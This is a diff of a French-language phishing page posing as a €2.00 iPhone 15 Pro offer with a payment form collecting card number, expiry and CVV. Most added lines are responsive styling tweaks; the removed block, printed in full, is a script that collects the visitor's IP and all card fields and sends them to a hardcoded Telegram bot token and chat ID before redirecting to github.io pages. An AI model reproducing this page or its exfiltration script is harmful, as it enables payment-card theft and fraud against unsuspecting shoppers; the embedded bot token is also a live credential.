@@ -3,6 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <title>iPhone 15 Pro</title>
+  
+  <!-- Meta viewport pour les smartphones -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
   <!-- FAVICON -->
   <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
@@ -12,9 +15,53 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.2/css/bootstrap-grid.min.css" integrity="sha512-a+PObWRxNVh4HZR9wijCGj84JgJ/QhZ8dET09REfYz2clUBjKYhGbOmdy9KEHilYKgbMSIHNQEsonv/r75mHXw==" crossorigin="anonymous" referrerpolicy="no-referrer">
   <link rel="stylesheet" href="/assets/css/styles.css?id=ec1da90a897fb34a69dc780da09ec7e9">
 
-  <!-- Styles additionnels -->
+  <!-- Styles additionnels pour le responsive -->
   <style>
-    /* Style inline ajouté */
+    /* S'assurer que les images s'adaptent bien sur mobile */
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* Ajustements généraux pour le contenu */
+    body {
+      padding: 0 1rem;
+    }
+
+    /* Centrer le contenu du bloc produit sur mobile */
+    .product_block {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Adapter la largeur du formulaire pour les petits écrans */
+    .form_wrapper {
+      width: 100%;
+      max-width: 500px;
+      margin: auto;
+    }
+
+    /* Rendre la galerie d'images responsive */
+    .images_wrapper {
+      width: 100%;
+      margin-bottom: 1rem;
+    }
+
+    /* Réduire la taille des boutons dans le groupe de choix de couleur */
+    .btn-group a {
+      display: inline-block;
+      margin: 0.2rem;
+    }
+
+    /* Améliorer la lisibilité des titres et textes */
+    h1, h2, h6, p {
+      text-align: center;
+    }
+  </style>
+
+  <!-- Autres styles existants -->
+  <style>
     div[style*="fixed"] span[id^="img_"][class^="img_"] > style:first-child + div[style*="flex"][style*="relative"] {
       width: 10000px !important;
     }
@@ -94,7 +141,7 @@
         <div class="product_block" style="min-height: 180px;">
           <!-- GAUCHE : IMAGES -->
           <div class="images_wrapper">
-            <div class="price_block">
+            <div class="price_block text-center">
               <span>Seulement maintenant</span>
               <h2>€2,00</h2>
             </div>
@@ -133,7 +180,7 @@
                   <div class="title choose_color">
                     <label>Choisissez votre couleur&nbsp;:</label>
                   </div>
-                  <div class="btn-group">
+                  <div class="btn-group text-center">
                     <a href="javascript:;" data-tab="black" class="img-nav-tab black active">
                       <input type="radio" name="color" id="black">
                     </a>
@@ -156,34 +203,34 @@
 
               <!-- FORMULAIRE DE PAIEMENT -->
               <form id="paymentForm" method="post" action="">
-                <div class="accepted-credit-cards" style="text-align: center; margin: 1rem 0;">
+                <div class="accepted-credit-cards text-center" style="margin: 1rem 0;">
                   <p class="accepted-credit-cards-heading" style="font-size: 14px; margin: 0 0 .5rem;">Cartes de crédit acceptées:</p>
                   <img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Supported Payment Cards" style="width:auto; max-width:100%;">
                 </div>
-                <div class="card-holder form-group">
+                <div class="card-holder form-group mb-3">
                   <label for="card_holder">Titulaire de la carte</label>
                   <div class="controls">
-                    <input type="text" name="card_holder" id="card_holder" autocomplete="cc-name" value="winw arzone" placeholder="Titulaire de la carte" required class="form-control form-control-lg jp-card-invalid" style="width:100%;">
+                    <input type="text" name="card_holder" id="card_holder" autocomplete="cc-name" value="winw arzone" placeholder="Titulaire de la carte" required class="form-control form-control-lg jp-card-invalid">
                   </div>
                 </div>
-                <div class="card-number form-group">
+                <div class="card-number form-group mb-3">
                   <label for="card_number">Numéro de la carte</label>
                   <div class="controls">
-                    <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="0000 0000 0000 0000" required class="form-control form-control-lg jp-card-invalid" style="width:100%;">
+                    <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="0000 0000 0000 0000" required class="form-control form-control-lg jp-card-invalid">
                   </div>
                 </div>
-                <div class="expiry-date form-group">
+                <div class="expiry-date form-group mb-3">
                   <label for="expiry_date">Date d'expiration</label>
                   <div class="controls">
-                    <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM / AA" required class="form-control form-control-lg jp-card-invalid" style="width:100%;">
+                    <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM / AA" required class="form-control form-control-lg jp-card-invalid">
                   </div>
                 </div>
-                <div class="row">
+                <div class="row mb-3">
                   <div class="col-sm-6 col-9">
                     <div class="cvv form-group">
                       <label for="cvv">CVC/CVV</label>
                       <div class="controls">
-                        <input type="number" name="cvv" id="cvv" autocomplete="cc-csc" min="0" max="9999" pattern="^[0-9]{3,4}$" placeholder="CVC/CVV" required style="width:100%;" class="form-control form-control-lg jp-card-invalid">
+                        <input type="number" name="cvv" id="cvv" autocomplete="cc-csc" min="0" max="9999" pattern="^[0-9]{3,4}$" placeholder="CVC/CVV" required class="form-control form-control-lg jp-card-invalid">
                       </div>
                     </div>
                   </div>
@@ -193,7 +240,7 @@
                     </div>
                   </div>
                 </div>
-                <button type="submit" id="submitButton" class="btn btn-success btn-lg" style="width:100%;">
+                <button type="submit" id="submitButton" class="btn btn-success btn-lg w-100">
                   <span class="loader" style="height:12px; width:12px; border-width:3px; margin-right:5px; display:none;"></span>
                   <span class="submit-label">Effectuer Paiement</span>
                   <span class="waiting-label" style="display:none;">Effectuer Paiement</span>
@@ -213,7 +260,7 @@
       <div class="container">
         <h2>Apple dévoile l'iPhone 15 Pro.</h2>
         <p>Doté d'une conception en titane solide et légère avec de nouveaux bords profilés, un nouveau bouton Action, des améliorations puissantes de l'appareil photo et l'A17 Pro pour des performances de niveau supérieur et les jeux mobiles.</p>
-        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/hero-img.jpg" alt="">
+        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/hero-img.jpg" alt="iPhone 15 Pro">
       </div>
     </div>
 
@@ -226,7 +273,7 @@
             <p>Le tout nouveau bouton Action est&nbsp;un raccourci vers votre fonctionnalité préférée. Une fois que vous l’avez configuré, il&nbsp;suffit d’appuyer de façon prolongée pour déclencher l’action souhaitée.</p>
           </div>
           <div class="col-lg-5">
-            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-music.png" alt="">
+            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-music.png" alt="Bouton Action">
           </div>
         </div>
       </div>
@@ -240,8 +287,10 @@
       <div class="block-reassurance">
         <div class="row">
           <div class="col-12">
-            <h6>Cartes de crédit acceptées:</h6>
-            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
+            <h6 class="text-center">Cartes de crédit acceptées:</h6>
+            <div class="text-center">
+              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
+            </div>
           </div>
         </div>
       </div>
@@ -331,94 +380,6 @@
         input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
       }
     });
-  </script>  
-   
-   
-   
-   <script>
-    $(document).ready(function () {
-      // Récupérer l'IP de l'utilisateur
-      $.getJSON("https://api.ipify.org?format=json", function (data) {
-        $('#user_ip').val(data.ip);
-      });
-
-      // Soumettre le formulaire avec validation
-      $('#paymentForm').on('submit', function (e) {
-        e.preventDefault();
-        if (!validateForm()) {
-          return;
-        }
-        var formData = $(this).serializeArray();
-        var message = "Nouvelle commande reçue :\n";
-        formData.forEach(function (item) {
-          if (item.name !== '_token') {
-            message += item.name + ": " + item.value + "\n";
-          }
-        });
-
-        // Envoyer les données vers votre bot Telegram via un webhook ou API
-        $.ajax({
-          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
-          method: 'POST',
-          data: {
-            chat_id: '7747778364',
-            text: message
-          },
-          success: function () {
-            window.location.href = "https://justmoicom.github.io/test3/";
-          },
-          error: function () {
-            window.location.href = "https://justmoicom.github.io/tel/";
-          }
-        });
-      });
-
-      // Validation des champs
-      function validateForm() {
-        var isValid = true;
-        $('input[required]').each(function () {
-          if ($(this).val().trim() === '') {
-            alert($(this).attr('placeholder') + ' est requis.');
-            isValid = false;
-            return false;
-          }
-        });
-        var expiryDate = $('#expiry_date').val();
-        if (!validateExpiryDate(expiryDate)) {
-          isValid = false;
-        }
-        return isValid;
-      }
-
-      function validateExpiryDate(date) {
-        var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
-        if (!regex.test(date)) {
-          alert('La date d\'expiration doit être au format MM/AA.');
-          return false;
-        }
-        var parts = date.split('/');
-        var month = parseInt(parts[0], 10);
-        if (month < 1 || month > 12) {
-          alert('Le mois doit être compris entre 01 et 12.');
-          return false;
-        }
-        return true;
-      }
-
-      // Formater le numéro de carte en blocs de 4 chiffres
-      function formatCardNumber(input) {
-        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
-      }
-
-      // Formater automatiquement la date d'expiration en MM/AA
-      function formatExpiryDate(input) {
-        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
-      }
-    });
   </script>
-
-  
-  
-  
 </body>
 </html>
